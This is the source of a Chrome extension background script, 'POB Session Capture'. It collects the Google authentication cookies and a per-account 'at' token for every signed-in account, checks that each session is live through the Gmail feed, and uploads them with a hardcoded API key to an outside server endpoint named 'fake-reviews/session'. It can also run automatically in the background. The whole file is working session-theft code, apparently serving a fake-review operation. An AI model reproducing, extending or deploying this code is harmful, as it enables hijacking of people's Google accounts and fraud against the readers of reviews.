/**
 * POB Session Capture — v3.2.0
 *
 * Captures every Google account signed into the current Chrome profile in one
 * pass. For each authuser slot 0..9 we:
 *   1. Ask myaccount.google.com who's signed in there (email + name).
 *   2. Scrape a fresh `at` (SNlM0e) token from /maps?authuser=N.
 *   3. Liveness-check via Gmail's atom feed for /mail/u/N/.
 *   4. Upload the (cookie_bundle, at, authuser, email) tuple to POB.
 *
 * Dead slots are surfaced in the popup instead of being uploaded as fresh.
 */

const API_BASE = "https://peopleopinionbox.com";
const API_KEY = "d5a1a12795108c8769225b9a551a41048e9a61b5dfdbb600f10fce924735e27b";
const EXTENSION_VERSION = "3.2.0";
const DEDUPE_MS = 12 * 60 * 60 * 1000;
const MAX_AUTHUSER = 9;
const REQUEST_TIMEOUT_MS = 20000;

const AUTH_COOKIE_NAMES = ["SAPISID", "__Secure-1PAPISID", "__Secure-3PAPISID", "APISID"];

// ---------- cookie sweep ----------

async function listCookieStoreIds() {
  try {
    const stores = await chrome.cookies.getAllCookieStores();
    const ids = (stores || []).map((s) => s.id).filter(Boolean);
    return ids.length ? ids : [undefined];
  } catch {
    return [undefined];
  }
}

async function getCookieBundle() {
  const urls = [
    "https://www.google.com/",
    "https://accounts.google.com/",
    "https://myaccount.google.com/",
    "https://maps.google.com/",
    "https://mail.google.com/",
    "https://docs.google.com/",
  ];
  const domains = [".google.com", "google.com", ".accounts.google.com"];
  const stores = await listCookieStoreIds();
  const seen = new Map(); // name -> value (first non-empty wins)
  const storeHits = new Map(); // storeId -> count of auth cookies

  const add = (jar, storeId) => {
    for (const c of jar || []) {
      if (!c || !c.name) continue;
      if (!seen.has(c.name)) seen.set(c.name, c.value);
      if (AUTH_COOKIE_NAMES.includes(c.name)) {
        storeHits.set(storeId || "default", (storeHits.get(storeId || "default") || 0) + 1);
      }
    }
  };

  for (const storeId of stores) {
    for (const url of urls) {
      const base = storeId ? { url, storeId } : { url };
      try {
        add(await chrome.cookies.getAll(base), storeId);
      } catch {}
      try {
        add(await chrome.cookies.getAll({ ...base, partitionKey: {} }), storeId);
      } catch {}
    }
    for (const domain of domains) {
      const base = storeId ? { domain, storeId } : { domain };
      try {
        add(await chrome.cookies.getAll(base), storeId);
      } catch {}
    }
  }

  const bundle = Array.from(seen, ([n, v]) => `${n}=${v}`).join("; ");
  const present = AUTH_COOKIE_NAMES.filter((n) => seen.has(n));
  return { bundle, present, storeHits: Object.fromEntries(storeHits), cookieCount: seen.size };
}

// ---------- per-account probes ----------

function stripAt(html) {
  const m = /"SNlM0e"\s*:\s*"([^"]+)"/.exec(html) || /"FdrFJe"\s*:\s*"([^"]+)"/.exec(html);
  return m ? m[1] : null;
}

function stripEmail(html) {
  // The Google Account chip payload carries `"email@…"` a few times; grab first gmail-ish match.
  const m = /["'\s>]([\w.+-]+@[\w.-]+\.[a-z]{2,})["'\s<]/i.exec(html);
  return m ? m[1] : null;
}

async function listSignedInAccounts() {
  // Canonical account enumerator. Returns JSON of every signed-in Google
  // account in this Chrome profile with its authuser index.
  const urls = [
    "https://accounts.google.com/ListAccounts?gpsia=1&source=ogb&json=standard",
    "https://accounts.google.com/ListAccounts?listPages=1&pid=23&mo=1&mn=1&hl=en&json=standard",
  ];
  for (const url of urls) {
    try {
      const res = await fetch(url, {
        method: "GET",
        credentials: "include",
        redirect: "follow",
        headers: { "accept-language": "en-US,en;q=0.9" },
      });
      if (!res.ok) continue;
      let text = await res.text();
      // Google prefixes JSON with `)]}'` to prevent hijacking.
      text = text.replace(/^\)\]\}'/, "").trim();
      const data = JSON.parse(text);
      // Shape: ["gaia.l.a.r", [ [ "gaia.l.a", 1, "Display Name", "email@x", photo, ..., authIndex, ... ], ... ]]
      const rows = Array.isArray(data) && Array.isArray(data[1]) ? data[1] : [];
      const accounts = [];
      for (const row of rows) {
        if (!Array.isArray(row)) continue;
        const email = row.find((v) => typeof v === "string" && /@/.test(v)) || null;
        // authuser index is usually at position 7, but scan for a small int in the tail.
        let authuser = null;
        for (let i = row.length - 1; i >= 6; i--) {
          if (typeof row[i] === "number" && row[i] >= 0 && row[i] <= 20) {
            authuser = row[i];
            break;
          }
        }
        if (email) accounts.push({ email, authuser: authuser ?? accounts.length });
      }
      // Normalise: dedupe by authuser, sort ascending.
      const byIdx = new Map();
      accounts.forEach((a, i) => {
        const idx = byIdx.has(a.authuser) ? i : a.authuser;
        byIdx.set(idx, { email: a.email, authuser: idx });
      });
      const list = Array.from(byIdx.values()).sort((a, b) => a.authuser - b.authuser);
      if (list.length) return list;
    } catch {}
  }
  return [];
}

async function scrapeAtForSlot(n) {
  const res = await fetch(`https://www.google.com/maps?authuser=${n}&hl=en`, {
    method: "GET",
    credentials: "include",
    headers: { "accept-language": "en-US,en;q=0.9" },
  });
  const html = await res.text();
  const at = stripAt(html);
  const email = stripEmail(html);
  return { at, email };
}

async function livenessProbe(n) {
  // Signed-in Gmail returns application/atom+xml; signed-out is redirected to
  // an HTML sign-in page. `redirect: follow` lets us tell them apart cheaply.
  try {
    const res = await fetch(`https://mail.google.com/mail/u/${n}/feed/atom`, {
      method: "GET",
      credentials: "include",
      redirect: "follow",
      headers: { "accept-language": "en-US,en;q=0.9" },
    });
    const ct = (res.headers.get("content-type") || "").toLowerCase();
    if (!res.ok) return { alive: false, reason: `HTTP ${res.status}` };
    if (ct.includes("xml")) return { alive: true };
    const body = (await res.text()).slice(0, 400);
    if (/<feed/i.test(body)) return { alive: true };
    return { alive: false, reason: "no atom feed (session dead)" };
  } catch (err) {
    return { alive: false, reason: String(err?.message || err) };
  }
}

// ---------- upload ----------

async function fetchWithTimeout(url, options, timeoutMs = REQUEST_TIMEOUT_MS) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    return await fetch(url, { ...options, signal: controller.signal });
  } finally {
    clearTimeout(timer);
  }
}

async function uploadSession({ cookieBundle, atToken, email, authuser }) {
  const payload = {
    label: email || `Session u${authuser} · ${new Date().toISOString().slice(0, 16)}`,
    google_email: email,
    auth_user_index: Number(authuser || 0),
    cookie_bundle: cookieBundle,
    at_token: atToken,
    user_agent: navigator.userAgent,
  };
  let lastError = null;
  for (let attempt = 1; attempt <= 3; attempt++) {
    try {
      const res = await fetchWithTimeout(`${API_BASE}/api/public/fake-reviews/session`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-api-key": API_KEY,
          "x-extension-version": EXTENSION_VERSION,
        },
        body: JSON.stringify(payload),
      });
      const text = await res.text();
      let data = {};
      try {
        data = text ? JSON.parse(text) : {};
      } catch {}
      if (res.ok) return data;
      if (res.status === 401) {
        throw new Error(data.error || "Extension access expired. Download the latest capture extension.");
      }
      if (res.status < 500 || attempt === 3) throw new Error(data.error || `Upload failed (HTTP ${res.status})`);
      lastError = new Error(data.error || `Upload failed (HTTP ${res.status})`);
    } catch (err) {
      lastError = err;
      if (attempt === 3 || String(err?.message || err).includes("access expired")) break;
    }
    await new Promise((resolve) => setTimeout(resolve, attempt * 750));
  }
  throw lastError || new Error("Upload failed");
}

// ---------- multi-account driver ----------

async function shouldSkipAuto(key) {
  const s = await chrome.storage.local.get([key]);
  return Date.now() - (s[key] || 0) < DEDUPE_MS;
}
async function markAuto(key) {
  await chrome.storage.local.set({ [key]: Date.now() });
}

async function captureAllAccounts({ mode }) {
  const diagnostics = { version: EXTENSION_VERSION, steps: [], cookies: null, accounts: [] };
  const cookies = await getCookieBundle();
  diagnostics.cookies = { present: cookies.present, total: cookies.cookieCount, storeHits: cookies.storeHits };
  if (!cookies.present.length) {
    const msg = `No Google auth cookie found (checked ${cookies.cookieCount} cookies across ${Object.keys(cookies.storeHits).length || 1} stores). Open google.com signed in.`;
    return { ok: false, error: msg, diagnostics };
  }

  // Discover slots via ListAccounts (canonical) with a per-slot fallback.
  let slots = await listSignedInAccounts();
  if (!slots.length) {
    // Fallback: try scraping /maps for slot 0 — if any at-token comes back the
    // profile IS signed in, we just couldn't enumerate. Report one slot.
    const s0 = await scrapeAtForSlot(0);
    if (s0.at) slots = [{ authuser: 0, email: s0.email }];
  }
  diagnostics.slotsDiscovered = slots.length;
  if (!slots.length) {
    return {
      ok: false,
      error: `Couldn't enumerate accounts even though ${cookies.present.join(", ")} are present. Open https://accounts.google.com in this Chrome profile, confirm you see your account list, then retry.`,
      diagnostics,
    };
  }

  const results = [];
  for (const slot of slots) {
    const entry = { authuser: slot.authuser, email: slot.email, status: "pending" };
    try {
      const dedupeKey = `lastAuto:${slot.email || `u${slot.authuser}`}:${slot.authuser}`;
      if (mode === "auto" && (await shouldSkipAuto(dedupeKey))) {
        entry.status = "skipped";
        entry.reason = "captured recently";
        results.push(entry);
        continue;
      }

      const live = await livenessProbe(slot.authuser);
      if (!live.alive) {
        entry.status = "dead";
        entry.reason = live.reason;
        results.push(entry);
        continue;
      }

      const scraped = await scrapeAtForSlot(slot.authuser);
      if (!scraped.at) {
        entry.status = "error";
        entry.reason = "could not parse SNlM0e token from /maps";
        results.push(entry);
        continue;
      }
      const email = slot.email || scraped.email || null;
      const uploaded = await uploadSession({
        cookieBundle: cookies.bundle,
        atToken: scraped.at,
        email,
        authuser: slot.authuser,
      });
      entry.email = email;
      entry.status = "captured";
      entry.id = uploaded.id;
      await markAuto(dedupeKey);
    } catch (err) {
      entry.status = "error";
      entry.reason = String(err?.message || err);
    }
    results.push(entry);
  }

  diagnostics.accounts = results;
  const okCount = results.filter((r) => r.status === "captured").length;
  const result = {
    ok: okCount > 0 || results.some((r) => r.status === "skipped"),
    captured: okCount,
    total: results.length,
    accounts: results,
    at: Date.now(),
    diagnostics,
  };
  await chrome.storage.local.set({ lastResult: result });
  try {
    chrome.action.setBadgeText({ text: okCount ? String(okCount) : results.length ? "!" : "" });
    chrome.action.setBadgeBackgroundColor({ color: okCount ? "#10b981" : "#ef4444" });
  } catch {}
  return result;
}

async function getPrefs() {
  const s = await chrome.storage.local.get(["prefs"]);
  return s.prefs || {};
}

chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  if (msg?.type === "pob-capture-session") {
    (async () => {
      const r = await captureAllAccounts({ mode: "manual" });
      sendResponse(r);
    })();
    return true;
  }
  if (msg?.type === "pob-auto-capture") {
    (async () => {
      try {
        const prefs = await getPrefs();
        if (prefs.autoDisabled) return;
        await captureAllAccounts({ mode: "auto" });
      } catch {}
    })();
    return false;
  }
  if (msg?.type === "pob-diagnostics") {
    (async () => {
      const cookies = await getCookieBundle();
      sendResponse({ cookies: { present: cookies.present, total: cookies.cookieCount, storeHits: cookies.storeHits } });
    })();
    return true;
  }
  return false;
});
